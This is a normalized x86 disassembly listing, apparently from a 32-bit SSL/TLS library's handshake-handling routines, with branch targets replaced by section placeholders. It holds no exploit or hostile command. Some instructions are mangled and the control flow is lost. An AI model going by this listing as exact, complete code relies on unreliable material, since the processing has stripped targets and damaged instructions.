jne r-xdata
mov edx [ ebx + 0x8 ]
push 0x0
push 0x0
call [ edx + 0x4c ]
mov edi [ esp + 0x2c ]
push ebx
add edi eax
mov [ esp + 0x30 ] edi
call sub_1000de40
push esi
push eax
call sub_1001e620
add esp 0x14
test eax eax
jge r-xdata
push 0x31d
push r--data
push 0xf8
push 0x92
push 0x14
mov [ esp + 0x24 ] 0x2f
call sub_1001de60
add esp 0x14
jmp r-xdata
mov [ esp + 0x10 ] 0x50
jmp r-xdata
mov edx [ ebx + 0xbc ]
mov ecx [ ebx + 0x98 ]
cmp ecx [ edx + 0x68 ]
jne r-xdata
mov eax [ ebx + 0xbc ]
mov ecx [ eax + 0xac ]
test ecx ecx
je r-xdata
push 0x328
push r--data
push 0x105
push 0x92
push 0x14
mov [ esp + 0x24 ] 0x2f
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x302
push r--data
push 0x110
push 0x92
push 0x14
mov [ esp + 0x24 ] 0x2f
call sub_1001de60
add esp 0x14
jmp r-xdata
lea esi [ edx + 0x6c ]
lea edi [ ebx + 0x9c ]
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov eax [ ebx + 0x6c ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax + 0xb0 ] ecx
mov [ ebx + 0x6c ] 0x1
jmp r-xdata
mov ecx [ ebx + 0x58 ]
xor eax eax
mov [ ecx + 0x348 ] esi
mov ecx [ esp + 0x24 ]
mov al [ ecx ]
inc ecx
test eax eax
mov [ esp + 0x24 ] ecx
jne r-xdata
mov edx [ ebx + 0xbc ]
mov ecx [ esi + 0x8 ]
mov eax [ edx + 0xb0 ]
cmp eax ecx
je r-xdata
mov ecx [ ebx + 0x8 ]
add eax ebp
push eax
mov [ esp + 0x28 ] eax
call [ ecx + 0x48 ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov edx [ ebx + 0xd8 ]
push eax
mov eax [ edx + 0x98 ]
push eax
call sub_10010aa0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebx + 0x58 ]
mov [ ecx + 0x384 ] eax
mov eax [ ebx ]
cmp eax 0x300
jle r-xdata
test [ ebx + 0xf4 ] 0x8
jne r-xdata
push 0x350
push r--data
push 0x101
push 0x92
push 0x14
mov [ esp + 0x24 ] 0x2f
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
add eax ecx
mov ecx [ esp + 0x24 ]
cmp ecx eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x10 ]
push edx
push eax
lea edx [ esp + 0x2c ]
push ecx
push edx
push ebx
call sub_100149f0
add esp 0x14
test eax eax
jne r-xdata
push 0x337
push r--data
push 0xc5
push 0x92
push 0x14
mov [ esp + 0x24 ] 0x2f
call sub_1001de60
add esp 0x14
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn
push 0x36f
push r--data
push 0x73
push 0x92
push 0x14
mov [ esp + 0x24 ] 0x32
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push ebx
call sub_10014bc0
add esp 0x4
test eax eax
jg r-xdata
push 0x35f
push r--data
push 0xdf
push 0x92
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x364
push r--data
push 0xe0
push 0x92
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub_10015ce0
mov eax 0x18
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x2c ]
lea ecx [ esp + 0x20 ]
push ecx
xor ebp ebp
mov edx [ edi + 0xfc ]
mov eax [ edi + 0x8 ]
push edx
push 0xffffffff
push 0x1131
push 0x1130
push edi
mov [ esp + 0x34 ] 0xffffffff
mov [ esp + 0x28 ] ebp
mov [ esp + 0x30 ] ebp
call [ eax + 0x30 ]
mov ebx eax
mov eax [ esp + 0x38 ]
add esp 0x18
cmp eax ebp
jne r-xdata
mov eax [ edi + 0x58 ]
mov ecx [ eax + 0x344 ]
cmp ecx 0xc
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x18
retn
pop edi
pop esi
mov [ eax + 0x358 ] 0x1
pop ebp
mov eax 0x1
pop ebx
add esp 0x18
retn
mov edx [ eax + 0x348 ]
test [ edx + 0xc ] 0x2000
je r-xdata
cmp ecx 0xb
je r-xdata
cmp ecx 0xe
je r-xdata
mov esi [ edi + 0x40 ]
call sub_1001e3c0
mov edx eax
test edx edx
mov [ esp + 0x10 ] edx
jne r-xdata
push 0x39a
push r--data
mov esi 0xa
push 0x72
xor ecx ecx
xor eax eax
mov ch [ esi ]
mov al [ esi + 0x2 ]
mov cl [ esi + 0x1 ]
add esi 0x3
shl ecx 0x8
or ecx eax
mov [ esp + 0x14 ] ecx
lea eax [ ecx + 0x3 ]
cmp eax ebx
je r-xdata
push 0x3a1
jmp r-xdata
xor eax eax
test ecx ecx
jbe r-xdata
push 0x3a9
push r--data
mov esi 0x32
push 0x9f
jmp r-xdata
push r--data
push 0x41
push 0x90
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
push edx
push edi
call sub_100110d0
mov ecx [ edi + 0xc4 ]
add esp 0x8
test ecx ecx
je r-xdata
jmp r-xdata
push 0x90
push 0x14
call sub_1001de60
add esp 0x14
mov edx [ esp + 0x18 ]
push edx
call sub_10023940
push ebp
call sub_10022870
mov eax [ esp + 0x18 ]
push sub_10022870
push eax
call sub_1001e730
mov eax [ esp + 0x2c ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
call sub_1001df60
call sub_10010fb0
mov esi eax
test esi esi
je r-xdata
test eax eax
jg r-xdata
xor ebx ebx
xor edx edx
mov bh [ esi ]
mov dl [ esi + 0x2 ]
mov bl [ esi + 0x1 ]
add esi 0x3
shl ebx 0x8
or ebx edx
lea eax [ ebx + eax + 0x3 ]
cmp eax ecx
mov [ esp + 0x24 ] eax
ja r-xdata
mov eax [ edi + 0xbc ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
mov edx [ edi + 0xe0 ]
push edx
call sub_10014490
push 0x3d7
push r--data
push 0x86
push 0x90
push 0x14
mov esi eax
call sub_1001de60
add esp 0x18
jmp r-xdata
push 0x3b2
push r--data
mov esi 0x32
push 0x87
jmp r-xdata
lea eax [ esp + 0x2c ]
push ebx
push eax
push 0x0
mov [ esp + 0x38 ] esi
call sub_10022820
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
mov ecx [ edi + 0xbc ]
mov eax [ esp + 0x10 ]
push 0x0
push eax
mov [ ecx + 0x90 ] esi
mov [ esi ] eax
call sub_1001e7c0
mov ebx eax
mov [ esp + 0x18 ] 0x0
push ebx
call sub_10021790
mov edx [ edi + 0x58 ]
mov ebp eax
add esp 0xc
mov [ esp + 0x18 ] ebp
mov eax [ edx + 0x348 ]
mov ecx [ eax + 0xc ]
xor eax eax
and ecx 0x7fff
cmp ecx 0x2020
setne al
test eax eax
mov [ esp + 0x24 ] eax
je r-xdata
push eax
call sub_10011010
add esp 0x4
push esi
push 0x2
push edi
call sub_10013ab0
add esp 0xc
push 0x3bb
push r--data
mov esi 0x2a
push 0xd
jmp r-xdata
mov eax [ esp + 0x2c ]
add ebx esi
cmp eax ebx
jne r-xdata
push ebp
push ebx
call sub_10014430
mov ebp eax
mov eax [ esp + 0x2c ]
add esp 0x8
test eax eax
je r-xdata
test ebp ebp
je r-xdata
push 0x3c1
push r--data
mov esi 0x32
push 0x87
jmp r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] 0x0
mov ecx [ edi + 0xbc ]
mov eax [ ecx + 0x94 ]
test eax eax
je r-xdata
test ebp ebp
jge r-xdata
push 0x3fc
push r--data
xor ebp ebp
mov esi 0x2
push 0xef
jmp r-xdata
push ebp
call sub_10023670
add esp 0x4
test eax eax
je r-xdata
push 0x3c6
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x2c ]
xor ebp ebp
cmp eax ecx
jb r-xdata
mov edx [ edi + 0xbc ]
mov [ edx + 0x94 ] 0x0
push eax
call sub_10022870
add esp 0x4
push 0x40d
push r--data
lea eax [ ebx + 0x10 ]
push 0x3
push 0x1
push eax
mov [ esi + 0x4 ] ebp
call sub_1001f5f0
mov eax [ esi + ebp * 8 + 0xc ]
lea ebp [ esi + ebp * 8 + 0xc ]
add esp 0x14
test eax eax
je r-xdata
push 0x406
push r--data
xor ebp ebp
mov esi 0x2
push 0xf7
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov [ ebp ] ebx
mov [ esi + 0x8 ] ebp
mov edx [ edi + 0xbc ]
mov eax [ edx + 0x94 ]
test eax eax
je r-xdata
push eax
call sub_10022870
add esp 0x4
push 0x417
push r--data
push 0x3
lea eax [ ebx + 0x10 ]
push 0x1
push eax
call sub_1001f5f0
mov eax [ edi + 0xbc ]
add esp 0x14
mov [ eax + 0x94 ] ebx
jmp r-xdata
push eax
call sub_10022870
add esp 0x4
mov eax [ edi + 0xbc ]
mov ecx [ edi + 0xe0 ]
xor ebp ebp
mov [ esp + 0x1c ] 0x1
mov [ eax + 0x98 ] ecx
jmp r-xdata
sub_10016130
mov eax 0xc0
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0xd4 ]
lea ecx [ esp + 0x4c ]
push ecx
xor ebp ebp
mov edx [ edi + 0xfc ]
mov eax [ edi + 0x8 ]
push edx
push 0xffffffff
push 0x1141
push 0x1140
push edi
mov [ esp + 0x2c ] ebp
mov [ esp + 0x34 ] ebp
mov [ esp + 0x38 ] ebp
mov [ esp + 0x3c ] ebp
mov [ esp + 0x48 ] ebp
mov [ esp + 0x40 ] ebp
call [ eax + 0x30 ]
mov ebx eax
mov eax [ esp + 0x64 ]
add esp 0x18
cmp eax ebp
jne r-xdata
mov eax [ edi + 0x58 ]
cmp [ eax + 0x344 ] 0xc
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0xc0
retn
mov eax [ edi + 0xbc ]
mov esi [ edi + 0x40 ]
mov [ esp + 0x44 ] esi
mov eax [ eax + 0x90 ]
cmp eax ebp
je r-xdata
pop edi
pop esi
mov [ eax + 0x358 ] 0x1
pop ebp
mov eax 0x1
pop ebx
add esp 0xc0
retn
call sub_10010fb0
mov edx [ edi + 0xbc ]
mov [ edx + 0x90 ] eax
mov eax [ eax + 0x3c ]
cmp eax ebp
je r-xdata
test al 0x10
je r-xdata
call sub_10029530
test eax eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ edi + 0xbc ]
mov ecx [ eax + 0x90 ]
mov eax [ ecx + 0x40 ]
cmp eax ebp
je r-xdata
push eax
call sub_100296b0
mov ecx [ edi + 0xbc ]
add esp 0x4
mov edx [ ecx + 0x90 ]
mov [ edx + 0x3c ] ebp
test al 0x6
jne r-xdata
call sub_100244f0
test eax eax
mov [ esp + 0x20 ] eax
jne r-xdata
xor eax eax
mov ah [ esi ]
mov al [ esi + 0x1 ]
add esi 0x2
mov [ esp + 0x10 ] eax
lea ebp [ eax + 0x2 ]
cmp ebp ebx
jle r-xdata
push 0x485
push r--data
push 0x41
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ edi + 0xbc ]
mov edx [ ecx + 0x90 ]
mov eax [ edx + 0x44 ]
cmp eax ebp
je r-xdata
push eax
call sub_10024660
mov edx [ edi + 0xbc ]
add esp 0x4
mov eax [ edx + 0x90 ]
mov [ eax + 0x40 ] ebp
mov esi 0x2f
push 0x4ff
test al 0x80
je r-xdata
xor eax eax
mov ah [ esi ]
mov al [ esi + 0x1 ]
add esi 0x2
mov [ esp + 0x10 ] eax
lea ebp [ eax + 0x2 ]
cmp ebp ebx
jle r-xdata
push 0x4bb
push r--data
push 0x5
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ ecx + 0x10 ]
push edx
push eax
push esi
call sub_10029d50
mov ecx [ esp + 0x28 ]
add esp 0xc
test eax eax
mov [ ecx + 0x10 ] eax
jne r-xdata
push 0x48d
push r--data
mov esi 0x32
push 0x79
jmp r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_10023940
mov eax [ esp + 0x20 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ edi + 0x58 ]
xor ebp ebp
mov ecx [ eax + 0x348 ]
lea eax [ esp + 0x34 ]
push eax
mov edx [ ecx + 0xc ]
mov [ esp + 0x1c ] edx
call sub_1002aa30
mov eax [ esp + 0x1c ]
add esp 0x4
test al 0x1
je r-xdata
push eax
call sub_10028ff0
mov eax [ edi + 0xbc ]
add esp 0x4
mov ecx [ eax + 0x90 ]
mov [ ecx + 0x44 ] ebp
jmp r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_100296b0
add esp 0x4
test al 0x40
je r-xdata
call sub_10028f90
test eax eax
mov [ esp + 0x24 ] eax
jne r-xdata
push 0x0
push eax
push esi
call sub_10029d50
mov ecx [ esp + 0x2c ]
add esp 0xc
test eax eax
mov [ ecx + 0x8 ] eax
jne r-xdata
push 0x4c3
push r--data
mov esi 0x32
push 0x6e
jmp r-xdata
mov eax [ esp + 0x10 ]
add esi eax
xor eax eax
mov ah [ esi ]
mov al [ esi + 0x1 ]
add esi 0x2
mov [ esp + 0x10 ] eax
lea ebp [ eax + ebp + 0x2 ]
cmp ebp ebx
jle r-xdata
push 0x492
push r--data
push 0x3
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
push esi
push 0x2
push edi
call sub_10013ab0
add esp 0xc
mov ecx [ esp + 0x30 ]
push ecx
call sub_1002dcb0
mov edx [ esp + 0x2c ]
push edx
call sub_1002d200
mov eax [ esp + 0x2c ]
add esp 0x8
test eax eax
je r-xdata
push eax
call sub_10024660
add esp 0x4
test ah 0x4
je r-xdata
push 0x56b
push r--data
mov esi 0xa
push 0xf4
jmp r-xdata
cmp ebx 0x3
jl r-xdata
push 0x50c
push r--data
push 0x41
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x10 ]
add esi eax
xor eax eax
mov ah [ esi ]
mov al [ esi + 0x1 ]
add esi 0x2
mov [ esp + 0x10 ] eax
lea ebp [ eax + ebp + 0x2 ]
cmp ebp ebx
jle r-xdata
push 0x4c8
push r--data
push 0x3
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ edx + 0x14 ]
push ecx
push eax
push esi
call sub_10029d50
mov edx [ esp + 0x28 ]
add esp 0xc
test eax eax
mov [ edx + 0x14 ] eax
jne r-xdata
push 0x49c
push r--data
mov esi 0x32
push 0x78
jmp r-xdata
lea eax [ esp + 0x34 ]
push eax
call sub_1002b000
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc0
retn
push eax
call sub_10028ff0
add esp 0x4
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov esi 0x28
push 0x572
jmp r-xdata
push 0x51f
push r--data
mov esi 0x50
push 0x13a
jmp r-xdata
cmp [ esi ] 0x3
jne r-xdata
push 0x0
push eax
push esi
call sub_10029d50
mov edx [ esp + 0x2c ]
add esp 0xc
test eax eax
mov [ edx + 0xc ] eax
jne r-xdata
push 0x4d2
push r--data
mov esi 0x32
push 0x6c
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
add esi edx
sub ebx ebp
test ah 0x1
je r-xdata
push 0x4a1
push r--data
push 0x3
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
test ah 0x8
jne r-xdata
xor eax eax
sub ebx 0x2
mov ah [ esi ]
push ecx
mov al [ esi + 0x1 ]
add esi 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x4c ] ebx
call sub_100234b0
mov ecx [ esp + 0x14 ]
add esp 0x4
cmp ecx ebx
jne r-xdata
push r--data
push 0xeb
xor eax eax
mov al [ esi + 0x2 ]
cmp eax 0x1
jl r-xdata
mov eax [ esp + 0x10 ]
add esi eax
xor eax eax
mov ah [ esi ]
mov al [ esi + 0x1 ]
add esi 0x2
mov [ esp + 0x10 ] eax
lea ebp [ eax + ebp + 0x2 ]
cmp ebp ebx
jle r-xdata
push 0x4d7
push r--data
push 0x3
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x4ac
jmp r-xdata
mov eax [ edi + 0xbc ]
mov ecx [ eax + 0x90 ]
mov edx [ ecx + 0xc ]
push edx
call sub_10021790
mov edx [ esp + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ edi + 0xbc ]
add esp 0x4
mov [ esp + 0x1c ] 0x0
mov ecx [ eax + 0x90 ]
mov [ ecx + 0x3c ] edx
test ebx ebx
je r-xdata
push 0x5dc
push 0x584
push r--data
mov esi 0x32
push 0x108
jmp r-xdata
cmp ebx eax
jg r-xdata
cmp eax 0x19
jg r-xdata
push 0x0
push eax
push esi
call sub_10029d50
mov ecx [ esp + 0x2c ]
add esp 0xc
test eax eax
mov [ ecx + 0x14 ] eax
jne r-xdata
push 0x4e1
push r--data
mov esi 0x32
push 0x6d
jmp r-xdata
push r--data
push 0x44
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_10023940
lea edx [ esp + 0x38 ]
push edx
call sub_1002b000
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc0
retn
push 0x5e2
push r--data
mov esi 0x32
push 0x99
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ eax * 4 + rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
sub ebx ebp
add esi eax
mov eax [ esp + 0x18 ]
test ah 0x1
je r-xdata
push 0x4e6
push r--data
push 0x3
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x14 ]
mov eax [ edx ]
cmp eax 0x6
jne r-xdata
push eax
call sub_1002df90
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
test ah 0x2
je r-xdata
mov edx [ edi + 0xbc ]
mov eax [ edx + 0x90 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp eax 0x74
jne r-xdata
lea eax [ esp + 0x50 ]
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x18 ] eax
mov ebx 0x2
mov edx [ esp + 0x24 ]
push ebp
push edx
call sub_10029430
add esp 0x8
test eax eax
jne r-xdata
push 0x526
push r--data
push 0x10
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ edi + 0xbc ]
mov ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x0
mov eax [ edx + 0x90 ]
mov [ eax + 0x40 ] ecx
jmp r-xdata
mov edx [ edi + 0xbc ]
mov eax [ edx + 0x90 ]
mov ecx [ eax + 0x1c ]
push ecx
call sub_10021790
add esp 0x4
mov [ esp + 0x14 ] eax
cmp eax 0x198
jne r-xdata
push 0x0
call sub_10025460
lea ecx [ esp + 0x38 ]
push eax
push ecx
call sub_1002aa50
mov edx [ edi + 0x58 ]
push 0x20
add edx 0xb8
lea eax [ esp + 0x44 ]
push edx
push eax
call sub_1002ab80
mov ecx [ edi + 0x58 ]
push 0x20
add ecx 0x98
lea edx [ esp + 0x50 ]
push ecx
push edx
call sub_1002ab80
mov eax [ esp + 0x68 ]
push ebp
lea ecx [ esp + 0x5c ]
push eax
push ecx
call sub_1002ab80
mov edx [ esp + 0x44 ]
lea eax [ esp + 0x64 ]
push edx
push ebx
push esi
push eax
call sub_1002bdb0
add esp 0x40
test eax eax
jg r-xdata
mov eax [ edi + 0xd8 ]
mov eax [ eax + 0x90 ]
mov edx [ edi + 0xd8 ]
mov eax [ edx + 0x8c ]
jmp r-xdata
push ebp
call sub_1002c3f0
mov eax [ esp + 0x28 ]
push eax
call sub_1002cb10
mov ecx [ edi + 0x58 ]
mov ebp eax
add esp 0x8
mov [ esp + 0x48 ] ebp
mov edx [ ecx + 0x348 ]
test [ edx + 0x10 ] 0x2
je r-xdata
push 0x52b
push r--data
push 0x10
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x18 ]
push 0x5d3
jmp r-xdata
push 0x0
call sub_10025450
lea ecx [ esp + 0x38 ]
push eax
push ecx
call sub_1002aa50
mov edx [ edi + 0x58 ]
push 0x20
add edx 0xb8
lea eax [ esp + 0x44 ]
push edx
push eax
call sub_1002ab80
mov ecx [ edi + 0x58 ]
push 0x20
add ecx 0x98
lea edx [ esp + 0x50 ]
push ecx
push edx
call sub_1002ab80
mov eax [ esp + 0x68 ]
push ebp
lea ecx [ esp + 0x5c ]
push eax
push ecx
call sub_1002ab80
mov edx [ esp + 0x44 ]
lea eax [ esp + 0x64 ]
push edx
push ebx
push esi
push eax
call sub_1002bdb0
add esp 0x40
test eax eax
jg r-xdata
push 0x5ba
push r--data
mov esi 0x33
push 0x7b
jmp r-xdata
lea ecx [ esp + 0x34 ]
push 0x8
push ecx
call sub_1002b610
add esp 0x8
cmp ebx 0x2
jne r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x48 ]
mov eax [ edx + 0xc ]
mov edx [ esp + 0x2c ]
push eax
push ecx
push esi
lea eax [ esp + 0x5c ]
push edx
push eax
push 0x72
call sub_1002c0e0
add esp 0x18
mov [ esp + 0x10 ] eax
test eax eax
jge r-xdata
push 0x0
lea ecx [ esp + 0x38 ]
push eax
push ecx
call sub_1002aa50
mov edx [ edi + 0x58 ]
push 0x20
add edx 0xb8
lea eax [ esp + 0x44 ]
push edx
push eax
call sub_1002ab80
mov ecx [ edi + 0x58 ]
push 0x20
add ecx 0x98
lea edx [ esp + 0x50 ]
push ecx
push edx
call sub_1002ab80
mov eax [ esp + 0x68 ]
push ebp
lea ecx [ esp + 0x5c ]
push eax
push ecx
call sub_1002ab80
mov eax [ esp + 0x48 ]
lea edx [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x68 ]
push eax
push ecx
call sub_1002aba0
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x68 ]
add esp 0x3c
add ecx eax
add edx eax
dec ebx
mov [ esp + 0x18 ] ecx
test ebx ebx
mov [ esp + 0x2c ] edx
jg r-xdata
push ebp
add esi 0x3
call sub_1002d150
add esp 0x4
mov [ esp + 0x28 ] eax
test eax eax
je r-xdata
push ebp
call sub_1002cca0
add esp 0x4
cmp eax 0xa3
jle r-xdata
push 0x5cc
push r--data
mov esi 0x33
push 0x7b
jmp r-xdata
jne r-xdata
push 0x5a1
push r--data
mov esi 0x33
push 0x76
jmp r-xdata
push 0x540
push r--data
push 0x41
push 0x8d
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x30 ] eax
je r-xdata
push 0x536
push r--data
mov esi 0x3c
push 0x136
jmp r-xdata
push 0x5a8
push r--data
mov esi 0x33
push 0x7b
jmp r-xdata
xor eax eax
mov al [ esi ]
inc esi
mov ebp eax
mov [ esp + 0x2c ] ebp
add ebp 0x4
cmp ebp ebx
jg r-xdata
push 0x54c
push r--data
mov esi 0x32
push 0x132
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov edx eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x4c ]
push edx
push esi
push eax
push ecx
call sub_1002d7c0
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
sub ebx ebp
add esi edx
test ah 0x1
je r-xdata
test ah 0x40
je r-xdata
mov edx [ edi + 0xbc ]
mov eax [ edx + 0x90 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push edx
push eax
call sub_10029460
mov ecx [ edi + 0xbc ]
mov eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x0
mov edx [ ecx + 0x90 ]
mov ecx [ esp + 0x38 ]
push ecx
mov [ edx + 0x44 ] eax
call sub_1002dcb0
mov edx [ esp + 0x34 ]
push edx
call sub_1002d200
add esp 0x10
mov [ esp + 0x28 ] 0x0
jmp r-xdata
mov edx [ edi + 0xbc ]
mov eax [ edx + 0x90 ]
mov ecx [ eax + 0x34 ]
push ecx
call sub_10021790
add esp 0x4
mov [ esp + 0x14 ] eax
sub_10016c00
mov eax 0x14
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x1c ]
push ebp
lea ecx [ esp + 0x14 ]
mov edx [ ebx + 0xfc ]
mov eax [ ebx + 0x8 ]
push esi
push ecx
push edx
push 0xffffffff
push 0x1151
xor ebp ebp
push 0x1150
push ebx
mov [ esp + 0x2c ] ebp
call [ eax + 0x30 ]
mov ecx [ esp + 0x30 ]
add esp 0x18
cmp ecx ebp
mov [ esp + 0x1c ] eax
je r-xdata
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax [ ebx + 0x58 ]
mov [ eax + 0x35c ] ebp
mov ecx [ ebx + 0x58 ]
mov eax [ ecx + 0x344 ]
cmp eax 0xe
jne r-xdata
cmp eax 0xd
push edi
je r-xdata
mov esi 0x1
mov [ ecx + 0x358 ] esi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
cmp [ ebx ] 0x300
jle r-xdata
push 0xa
push 0x2
push ebx
call sub_10013ab0
push 0x61d
push r--data
push 0x106
push 0x87
push 0x14
call sub_1001de60
mov eax [ esp + 0x38 ]
add esp 0x20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov esi [ ebx + 0x40 ]
push sub_10016f10
call sub_1001e440
add esp 0x4
cmp eax ebp
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ ecx + 0x348 ]
mov eax [ ecx + 0xc ]
test ah 0x8
je r-xdata
xor edx edx
mov dl [ esi ]
inc esi
mov edi edx
cmp edi 0x7
mov [ esp + 0x28 ] edi
jbe r-xdata
push 0x631
jmp r-xdata
push 0xa
push 0x2
push ebx
call sub_10013ab0
push 0x628
push r--data
push 0xe8
push 0x87
push 0x14
call sub_1001de60
mov eax [ esp + 0x38 ]
add esp 0x20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
xor eax eax
cmp edi ebp
jbe r-xdata
mov [ esp + 0x28 ] 0x7
mov edi [ esp + 0x28 ]
push r--data
push 0x41
push 0x87
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
add esi edi
xor eax eax
mov al [ esi + 0x1 ]
mov ah [ esi ]
add esi 0x2
mov ebp eax
mov eax [ esp + 0x20 ]
lea ecx [ edi + ebp + 0x3 ]
cmp ecx eax
je r-xdata
mov ecx [ ebx + 0x58 ]
mov dl [ eax + esi ]
mov [ ecx + eax + 0x364 ] dl
inc eax
cmp eax edi
jb r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
test ebp ebp
jbe r-xdata
push 0x32
push 0x2
push ebx
call sub_10013ab0
push 0x64b
push r--data
push 0x9f
mov eax [ esp + 0x18 ]
pop edi
push sub_10020210
push eax
call sub_1001e730
add esp 0x8
mov edx [ ebx + 0x58 ]
mov esi 0x1
mov [ edx + 0x35c ] esi
mov eax [ ebx + 0x58 ]
mov [ eax + 0x360 ] edi
mov ecx [ ebx + 0x58 ]
mov eax [ ecx + 0x36c ]
test eax eax
je r-xdata
xor edx edx
mov dl [ esi + 0x1 ]
mov dh [ esi ]
add esi 0x2
mov edi edx
lea eax [ eax + edi + 0x2 ]
cmp eax ebp
mov [ esp + 0x20 ] eax
ja r-xdata
mov edx [ ebx + 0x58 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x18 ] esi
pop edi
mov [ edx + 0x36c ] eax
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push sub_10020210
push eax
call sub_1001e730
add esp 0x8
test [ ebx + 0xf4 ] 0x20000000
jne r-xdata
lea eax [ esp + 0x14 ]
push edi
push eax
push 0x0
mov [ esp + 0x20 ] esi
call sub_100201c0
add esp 0xc
test eax eax
je r-xdata
call sub_1001df60
push 0x32
push 0x2
push ebx
call sub_10013ab0
push 0x657
push r--data
push 0x84
jmp r-xdata
test [ ebx + 0xf4 ] 0x20000000
jne r-xdata
mov ecx [ esp + 0x14 ]
add esi edi
cmp ecx esi
jne r-xdata
push 0x87
push 0x14
call sub_1001de60
add esp 0x20
push 0x32
push 0x2
push ebx
call sub_10013ab0
push 0x665
push r--data
push 0xd
jmp r-xdata
push 0x32
push 0x2
push ebx
call sub_10013ab0
push 0x66d
push r--data
push 0x83
jmp r-xdata
mov ecx [ esp + 0x10 ]
push eax
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0x672
mov eax [ esp + 0x20 ]
cmp eax ebp
jb r-xdata
jmp r-xdata
mov edi [ esp + 0x28 ]
sub_10016f30
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov eax [ ebx + 0x8 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
push 0x4000
push 0xffffffff
push 0x11e1
push 0x11e0
push ebx
call [ eax + 0x30 ]
